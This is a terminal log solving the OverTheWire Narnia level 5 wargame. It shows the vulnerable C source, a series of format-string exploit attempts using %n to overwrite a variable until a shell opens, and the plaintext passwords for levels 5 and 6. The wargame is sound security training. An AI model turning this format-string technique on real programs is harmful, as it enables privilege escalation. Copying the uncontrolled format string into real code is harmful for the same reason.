Terminal
===
```  
ssh narnia5@narnia.labs.overthewire.org  
narnia5@narnia.labs.overthewire.org's password: faimahchiy <enter>  
narnia5@melinda:~$ cd /narnia   
narnia5@melinda:/narnia$ cat narnia5.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}  
narnia5@melinda:/narnia$ ./narnia5 AAAA%x%x%x%x%x        
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7eb6716ffffffffffffd6aef7e2ec3441414141] (44)
i = 1 (0xffffd6cc)  
narnia5@melinda:/narnia$ ./narnia5 $(python -c'print "\xcc\xd6\xff\xff" + "A"*500 + "%x%x%x%x%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd4dc)  
narnia5@melinda:/narnia$ ./narnia5 $(python -c'print "\xdc\xd4\xff\xff" + "A"*500 + "%x%x%x%x%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 536 (0xffffd4dc)  
narnia5@melinda:/narnia$ ./narnia5 $(python -c'print "\xdc\xd4\xff\xff" + "A"*464 + "%x%x%x%x%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAA?] (34)
i = 1 (0xffffd4fc)  
narnia5@melinda:/narnia$ ./narnia5 $(python -c'print "\xfc\xd4\xff\xff" + "A"*464 + "%x%x%x%x%n"')
Change i's value from 1 -> 500. GOOD  
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng

```
